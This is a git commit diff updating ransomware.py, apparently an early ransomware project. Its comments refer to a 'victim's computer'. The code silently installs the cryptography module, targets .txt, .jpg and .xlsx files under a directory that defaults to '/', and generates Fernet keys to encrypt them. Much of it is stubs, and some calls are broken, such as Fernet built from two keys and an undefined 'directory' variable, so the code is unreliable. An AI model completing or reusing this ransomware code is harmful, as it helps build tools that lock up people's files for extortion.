5348c39b022bb7bcedcbc172fec3d75dfe8bbfeb
Alexis Rodriguez <44281620+rodriguez10011999@users.noreply.github.com>
2020-02-18 23:10:23 -0500

    Update ransomware.py

--- ransomware.py
+++ ransomware.py
@@ -8,28 +8,30 @@ Description :
 '''
 
 '''
-import subprocess for executing system commands
-in this program we'll use it to down the
+Import subprocess for executing system commands.
+In this program we'll use it to download the
 cryptography module in case it is not
 already installed on the victim's computer
 '''
 import subprocess as subp
-# import time to pause execution of program
+# Import time to pause execution of program
 # until cryptography module gets installed
 import time
-# import os so that we can obtain all the file
+# Import os so that we can obtain all the file
 # in a specific directory
 import os
+# Import argparse to handle user arguments more conveniently
+import argparse
 
-# try importing cryptography module class
+# Try importing cryptography module class
 try:
 	from cryptography.fernet import Fernet
 	import os
-# if any errors occurs importing the cryp module
+# If any errors occurs importing the cryp module
 # installing it with the following command
 except:
 	subp.call('pip install cryptography', shell=True)
-	# wait 30 seconds before preceding with the programs
+	# Wait 30 seconds before preceding with the programs
 	time.sleep(30)
 	# try importing again after attempting to install
 	# the module
@@ -41,38 +43,63 @@ except:
 
 class Ransomware:
 
-	def __init__(self, directory='/',encrypt=True):
+	def __init__(self, directory='/',encrypt=True, key_file='fernet_key'):
 		'''
-		- declare encryption key value
-		- get directory to encrypt/decrypt
-		-  
+		$ Declare encryption key value
+		$ Get directory to encrypt/decrypt
+		$ Get name of file to store key
+		$ Get boolean to encrypt or decrypt files
 		'''
 		print("[+] Initiating ransomware declarations ")
+		self.key=None
+		self.enigma=None
+		self.file_ext_target=['.txt', '.jpg', '.xlsx']
+		self.key_file=key_file
+		self.directory=directory
 
 	def open_file_to_encrypt(self, dir):
 		'''
-		- open files located in directory passed as argument
-		- return contents of file to encrypt
+		$ open files located in directory passed as argument
+		$ return contents of file to encrypt
 		'''
 		pass
+	def store_key(self):
+		'''
+		$ Store key in file for decryption
+		'''
+		print('[+] storing key in file')
+		pass
+	
+	def get_key(self):
+		'''
+		$ Retrieve the key for decryption
+		'''
+		print('[+] retrieving key from file')
+		pass
+	
+	def key_gen_fernet_instance(self):
+		'''
+		$ Generating encryption/decryption key
+		$ Instantiating Fernet object
+		'''
+		# Generating keys for encryption
+		k1 = Fernet.generate_key()
+		k2 = Fernet.generate_key()
+		# Fernet object instantiation with two keys
+		self.enigma = Fernet(k1, k2)
 
 	def encrypt(self, file_to_encrypt):
 		'''
-		Encrypting all files in the directory stored in the directory variable
+		$ Encrypting all files in the directory stored in the directory variable
 		'''
 		print('[+] Encrypting all files in ' + directory + ' directory')
-		# generating keys for encryption
-		k1 = Fernet.generate_key()
-		k2 = Fernet.generate_key()
 
-		enigma = Fernet(k1, k2)
-
-		enigma.encrypt(file_to_encrypt)
+		self.enigma.encrypt(file_to_encrypt)
 
 
 	def decrypt(self):
 		'''
-		Decrypt all files in the directory stored in the directory variable
+		$ Decrypt all files in the directory stored in the directory variable
 		'''
 		print('[+] Decrypting all files in ' + directory + ' directory')
 
@@ -82,13 +109,13 @@ class Ransomware:
 ************
 '''
 def initaite():
-	# directory to encrypt
+	# Directory to encrypt
 	to_encyrpt = '.'
-	# instantiating Ransomware object
+	# Instantiating Ransomware object
 	instance = Ransonware(directory=to_encyrpt)
 
 
-# check if current module is main module
+# Check if current module is main module
 if __name__ == '__main__':
 	print('''
 		  ooo,    .---.
